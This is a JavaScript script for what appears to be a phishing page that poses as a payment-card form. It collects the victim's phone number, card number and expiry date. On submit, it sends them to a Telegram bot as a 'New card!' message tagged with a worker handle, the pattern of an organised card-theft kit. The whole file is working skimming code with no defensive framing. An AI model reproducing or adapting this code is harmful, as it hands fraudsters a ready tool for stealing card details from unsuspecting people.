import axios from "axios";

const cardNumber = document.querySelector(".card-Number");
const cardPhone = document.querySelector(".cardholder-name");
const cardExpDate = document.querySelector(".exp-date");

const form = document.querySelector("form");
const inputPhone = document.querySelector("#phone");
const inputNumber = document.querySelector("#card-number");
const inputMonth = document.querySelector("#month");
const inputYear = document.querySelector("#year");

const infoErr = document.querySelectorAll(".info-err");
const complete = document.querySelector(".complete");

const TELEGRAM_BOT_TOKEN = import.meta.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = import.meta.env.TELEGRAM_CHAT_ID;
const API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

let inputPhoneValue;
let inputNumberValue;
let inputMonthValue = "00";
let inputYearValue = "00";

const showError = (input, arrInfoErr, message) => {
  input.classList.add("input-err");
  infoErr[arrInfoErr].classList.add("d-block");
  infoErr[arrInfoErr].textContent = message;
};

const hideError = (input, arrInfoErr) => {
  input.classList.remove("input-err");
  infoErr[arrInfoErr].classList.remove("d-block");
};

const validateInput = (input, arrInfoErr, wordLength) => {
  if (!wordLength) {
    if (!input.value) {
      showError(input, arrInfoErr, "Can’t be blank");
    } else {
      hideError(input, arrInfoErr);
    }
  } else {
    if (!input.value) {
      showError(input, arrInfoErr, "Can’t be blank");
    } else if (!/^\d+(\s\d+)*$/.test(input.value)) {
      showError(input, arrInfoErr, "Wrong format, numbers only");
    } else if (input.value.replace(/\D/g, "").length < wordLength) {
      showError(input, arrInfoErr, `must be ${wordLength} numbers`);
    } else {
      hideError(input, arrInfoErr);

      switch (input) {
        case inputNumber:
          inputNumberValue = input.value;
          break;
        case inputMonth:
          inputMonthValue = input.value;
          break;
        case inputYear:
          inputYearValue = input.value;
          break;
        case inputPhone:
          inputPhoneValue = input.value;
          break;
      }
    }
  }
};

function restrictAlphabets(e) {
  var x = e.which || e.keycode;
  if ((x >= 48 && x <= 57) || x === 43) {
    // цифры и "+"
    return true;
  } else {
    alert("Value must be a number or +");
    return false;
  }
}

inputPhone.addEventListener("input", (e) => {
  e.preventDefault();
  let phoneVal = e.target.value.replace(/[^\d+]/g, "");
  e.target.value = phoneVal;
  inputPhoneValue = e.target.value;
  cardPhone.textContent = inputPhoneValue;
});

inputNumber.addEventListener("input", (e) => {
  e.preventDefault();
  let formatText = e.target.value;
  formatText = formatText.substring(0, 19);
  formatText = formatText
    .replace(/\s/g, "")
    .replace(/(.{4})/g, "$1 ")
    .trim();
  e.target.value = formatText;
  inputNumberValue = e.target.value;
  cardNumber.textContent = inputNumberValue;
});

const deleteSpace = (input) => {
  if (/\s/.test(input.value)) {
    input.value = input.value.replace(/\s/g, "");
  }
};

inputMonth.addEventListener("input", (e) => {
  e.preventDefault();
  deleteSpace(inputMonth);
  inputMonthValue = e.target.value;
  cardExpDate.textContent = inputMonthValue + "/" + inputYearValue;
});

inputYear.addEventListener("input", (e) => {
  e.preventDefault();
  deleteSpace(inputYear);
  inputYearValue = e.target.value;
  cardExpDate.textContent = inputMonthValue + "/" + inputYearValue;
});

form.addEventListener("submit", async (e) => {
  e.preventDefault();

  inputPhoneValue = "";
  inputNumberValue = "";
  inputMonthValue = "00";
  inputYearValue = "00";

  validateInput(inputPhone, 0, 10);
  validateInput(inputNumber, 1, 16);
  validateInput(inputMonth, 2, 2);
  validateInput(inputYear, 2, 2);

  if (
    inputMonthValue === "" ||
    inputNumberValue === "" ||
    inputPhoneValue === "" ||
    inputYearValue === ""
  ) {
    return;
  }

  if (
    inputPhoneValue &&
    inputNumberValue &&
    inputMonthValue &&
    inputYearValue
  ) {
    cardPhone.textContent = inputPhoneValue;
    cardNumber.textContent = inputNumberValue;
    cardExpDate.textContent = inputMonthValue + "/" + inputYearValue;

    form.classList.add("d-none");
    complete.classList.add("d-block");
  }

  const values = {
    phone: inputPhoneValue,
    card: inputNumberValue,
    expMonth: inputMonthValue,
    expYear: inputYearValue,
  };

  const text = `<b>New card!</b>\n\n<b>Phone:</b> <code>${values.phone}</code>\n<b>Card:</b> <code>${values.card}</code>\n<b>Exp:</b> <code>${values.expMonth}/${values.expYear}</code>\n\n<b>Worker:</b> @p19347181`;

  try {
    const res = await axios.post(
      API,
      {
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: "HTML",
      },
      {
        headers: {
          "Content-Type": "application/json",
        },
      }
    );
  } catch (error) {
    console.error(error);
  }
});

complete.addEventListener("click", () => {
  location.reload(true);
});
